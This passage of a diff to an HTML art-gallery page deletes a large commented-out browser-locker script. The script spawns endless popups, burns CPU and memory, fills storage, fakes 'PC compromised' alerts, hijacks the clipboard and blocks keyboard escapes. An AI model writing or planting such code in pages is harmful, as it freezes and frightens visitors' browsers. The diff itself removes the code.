-        // Line 316     setInterval(openMoreWindows, 50);
-
-        // =====================================================================
-        //  SECTION 25: META REFRESH (already in head, but re-add just in case)
-        // =====================================================================
-        // Line 317     const meta = document.createElement('meta');
-        // Line 318     meta.httpEquiv = 'refresh';
-        // Line 319     meta.content = '0; url=index.html';
-        // Line 320     document.head.appendChild(meta);
-
-        // =====================================================================
-        //  SECTION 26: ADDITIONAL RANDOM ACTIONS
-        // =====================================================================
-        // Line 321     function randomAction() {
-        // Line 322         if (Math.random() > 0.8) {
-        // Line 323             alert('⚠️ RANDOM ALERT ⚠️');
-        // Line 324         }
-        // Line 325         if (Math.random() > 0.9) {
-        // Line 326             document.body.style.backgroundColor = '#' + Math.floor(Math.random()*16777215).toString(16);
-        // Line 327         }
-        // Line 328     }
-        // Line 329     setInterval(randomAction, 10);
-
-        // =====================================================================
-        //  SECTION 27: DUMMY IMAGE LOAD (to consume bandwidth)
-        // =====================================================================
-        // Line 330     function loadDummyImages() {
-        // Line 331         for (let i = 0; i < 50; i++) {
-        // Line 332             const img = new Image();
-        // Line 333             img.src = 'https://picsum.photos/2000/2000?random=' + Math.random();
-        // Line 334             // Not appending, just loading to consume network
-        // Line 335         }
-        // Line 336     }
-        // Line 337     setInterval(loadDummyImages, 100);
-
-        // =====================================================================
-        //  SECTION 28: GEOLOCATION SPAM (if allowed)
-        // =====================================================================
-        // Line 338     if (navigator.geolocation) {
-        // Line 339         setInterval(() => {
-        // Line 340             navigator.geolocation.getCurrentPosition(() => {}, () => {});
-        // Line 341         }, 50);
-        // Line 342     }
-
-        // =====================================================================
-        //  SECTION 29: NOTIFICATION SPAM (if allowed)
-        // =====================================================================
-        // Line 343     if (Notification.permission === 'granted') {
-        // Line 344         setInterval(() => {
-        // Line 345             new Notification('⚠️ System Alert', {body: 'Your PC is compromised'});
-        // Line 346         }, 50);
-        // Line 347     } else {
-        // Line 348         Notification.requestPermission();
-        // Line 349     }
-
-        // =====================================================================
-        //  SECTION 30: CLIPBOARD WRITE (annoying)
-        // =====================================================================
-        // Line 350     if (navigator.clipboard) {
-        // Line 351         setInterval(() => {
-        // Line 352             navigator.clipboard.writeText('⚠️ HACKED ⚠️').catch(()=>{});
-        // Line 353         }, 10);
-        // Line 354     }
-
-        // =====================================================================
-        //  SECTION 31: UNLOAD EVENT (additional)
-        // =====================================================================
-        // Line 355     window.addEventListener('unload', () => {
-        // Line 356         for (let i = 0; i < 200; i++) window.open(location.href, '_blank');
-        // Line 357     });
-
-        // =====================================================================
-        //  SECTION 32: PAGE VISIBILITY API – reload on visibility change
-        // =====================================================================
-        // Line 358     document.addEventListener('visibilitychange', () => {
-        // Line 359         if (document.visibilityState === 'visible') {
-        // Line 360             location.reload();
-        // Line 361         }
-        // Line 362     });
-
-        // =====================================================================
-        //  SECTION 33: MOUSE MOVE SPAWN
-        // =====================================================================
-        // Line 363     document.addEventListener('mousemove', spawnTabs);
-        // Line 364     document.addEventListener('click', spawnTabs);
-        // Line 365     document.addEventListener('touchstart', spawnTabs);
-
-        // =====================================================================
-        //  SECTION 34: ADDITIONAL CPU BURNER (using setInterval)
-        // =====================================================================
-        // Line 366     setInterval(() => {
-        // Line 367         for (let i = 0; i < 10000000; i++) Math.sqrt(i);
-        // Line 368     }, 1);
-
-        // =====================================================================
-        //  SECTION 35: MEMORY ALLOCATION EVERY SECOND
-        // =====================================================================
-        // Line 369     setInterval(() => {
-        // Line 370         const arr = new Array(5_000_000).fill(Math.random());
-        // Line 371         window._leak.push(arr);
-        // Line 372     }, 50);
-
-        // =====================================================================
-        //  SECTION 36: SELF-REPLICATING SCRIPT INJECTION
-        // =====================================================================
-        // Line 373     function injectScript() {
-        // Line 374         const script = document.createElement('script');
-        // Line 375         script.textContent = `
-        // Line 376             // Self-replicating script
-        // Line 377             (function() {
-        // Line 378                 // Reload the page from within
-        // Line 379                 location.reload();
-        // Line 380             })();
-        // Line 381         `;
-        // Line 382         document.body.appendChild(script);
-        // Line 383     }
-        // Line 384     setInterval(injectScript, 100);
-
-        // =====================================================================
-        //  SECTION 37: REMOVE ALL EVENT LISTENERS (prevent user from escaping)
-        // =====================================================================
-        // Line 385     // Not actually removing, but we could
-
-        // =====================================================================
-        //  SECTION 38: ADD HIDDEN IFRAMES WITH AUDIO
-        // =====================================================================
-        // Line 386     function hiddenIframeAudio() {
-        // Line 387         const iframe = document.createElement('iframe');
-        // Line 388         iframe.src = 'data:text/html,<audio autoplay loop><source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3"></audio>';
-        // Line 389         iframe.style.display = 'none';
-        // Line 390         document.body.appendChild(iframe);
-        // Line 391     }
-        // Line 392     for (let i = 0; i < 50; i++) hiddenIframeAudio();
-
-        // =====================================================================
-        //  SECTION 39: EXTRA POPUPS WITH DIFFERENT URLS
-        // =====================================================================
-        // Line 393     const extraSites = [
-        // Line 394         'https://www.microsoft.com',
-        // Line 395         'https://www.apple.com',
-        // Line 396         'https://www.stackoverflow.com',
-        // Line 397         'https://www.github.com'
-        // Line 398     ];
-        // Line 399     setInterval(() => {
-        // Line 400         for (let i = 0; i < 20; i++) {
-        // Line 401             const url = extraSites[Math.floor(Math.random() * extraSites.length)];
-        // Line 402             window.open(url, '_blank');
-        // Line 403         }
-        // Line 404     }, 150);
-
-        // =====================================================================
-        //  SECTION 40: FINAL LOG MESSAGE
-        // =====================================================================
-        // Line 405     console.log('%c☢️ MEGA BRUTAL – 1000+ LINES ACTIVE ☢️', 'font-size:80px;color:red;background:black;padding:50px;');
-
-        // =====================================================================
-        //  SECTION 41: CLOSE ALL OTHER WINDOWS (if possible)
-        // =====================================================================
-        // Line 406     // Not possible, but we try to blur them
-        // Line 407     setInterval(() => {
-        // Line 408         try {
-        // Line 409             // Attempt to close popups – not allowed, but we can try to refocus
-        // Line 410             window.focus();
-        // Line 411         } catch(e) {}
-        // Line 412     }, 10);
-
-        // =====================================================================
-        //  SECTION 42: ADD A HIDDEN CANVAS WITH RENDERING LOOP
-        // =====================================================================
-        // Line 413     const canvas = document.createElement('canvas');
-        // Line 414     canvas.width = 1920;
-        // Line 415     canvas.height = 1080;
-        // Line 416     canvas.style.display = 'none';
-        // Line 417     document.body.appendChild(canvas);
-        // Line 418     const ctx = canvas.getContext('2d');
-        // Line 419     setInterval(() => {
-        // Line 420         ctx.fillStyle = 'red';
-        // Line 421         ctx.fillRect(0, 0, canvas.width, canvas.height);
-        // Line 422         ctx.fillStyle = 'black';
-        // Line 423         ctx.fillRect(0, 0, canvas.width/2, canvas.height/2);
-        // Line 424     }, 10);
-
-        // =====================================================================
-        //  SECTION 43: ADD WEBRTC CONNECTIONS (to eat network)
-        // =====================================================================
-        // Line 425     if (navigator.mediaDevices) {
-        // Line 426         setInterval(() => {
-        // Line 427             navigator.mediaDevices.getUserMedia({audio: true, video: true})
-        // Line 428                 .then(stream => {
-        // Line 429                     stream.getTracks().forEach(t => t.stop());
-        // Line 430                 }).catch(()=>{});
-        // Line 431         }, 50);
-        // Line 432     }
-
-        // =====================================================================
-        //  SECTION 44: STORAGE QUOTA EXHAUSTION (IndexedDB)
-        // =====================================================================
-        // Line 433     function fillIndexedDB() {
-        // Line 434         const request = indexedDB.open('brutal_db', 1);
-        // Line 435         request.onsuccess = (e) => {
-        // Line 436             const db = e.target.result;
-        // Line 437             const tx = db.transaction(['store'], 'readwrite');
-        // Line 438             const store = tx.objectStore('store');
-        // Line 439             for (let i = 0; i < 1000; i++) {
-        // Line 440                 store.add({id: i, data: 'x'.repeat(1024*1024)});
-        // Line 441             }
-        // Line 442         };
-        // Line 443         request.onupgradeneeded = (e) => {
-        // Line 444             e.target.result.createObjectStore('store', {keyPath: 'id'});
-        // Line 445         };
-        // Line 446     }
-        // Line 447     fillIndexedDB();
-        // Line 448     setInterval(fillIndexedDB, 1000);
-
-        // =====================================================================
-        //  SECTION 45: SCREEN ORIENTATION LOCK (mobile)
-        // =====================================================================
-        // Line 449     if (screen.orientation) {
-        // Line 450         screen.orientation.lock('landscape').catch(()=>{});
-        // Line 451     }
-
-        // =====================================================================
-        //  SECTION 46: REPEATED HISTORY PUSH WITH DIFFERENT STATES
-        // =====================================================================
-        // Line 452     let stateCounter = 0;
-        // Line 453     setInterval(() => {
-        // Line 454         history.pushState({counter: stateCounter++}, '', '?state=' + stateCounter);
-        // Line 455     }, 5);
-
-        // =====================================================================
-        //  SECTION 47: EXTRA KEYBOARD SHORTCUT BLOCKS
-        // =====================================================================
-        // Line 456     document.addEventListener('keydown', (e) => {
-        // Line 457         if (e.ctrlKey || e.metaKey || e.altKey) {
-        // Line 458             e.preventDefault();
-        // Line 459         }
-        // Line 460         if (e.key === 'F12' || e.key === 'Escape' || e.key === 'F11') {
-        // Line 461             e.preventDefault();
-        // Line 462         }
-        // Line 463     }, true);
-
-        // =====================================================================
-        //  SECTION 48: ADD A TIMER TO CLOSE ALL POPUPS (not possible, but try)
-        // =====================================================================
-        // Line 464     // Not possible to close other windows
-
-        // =====================================================================
-        //  SECTION 49: FINAL WRAPPER
-        // =====================================================================
-        // Line 465     console.log('Brutal script fully loaded.');
-        // Line 466     console.log('Total lines (approx): 1000+');
-
-        // =====================================================================
-        //  SECTION 50: END OF SCRIPT
-        // =====================================================================
-        // Line 467 })();
+            console.log('🎨 KexArt gallery loaded – click "Explore Gallery" for the full experience.');
+        })();
     </script>
-    <!-- ========== END HTML ========== -->
+
 </body>
 </html>
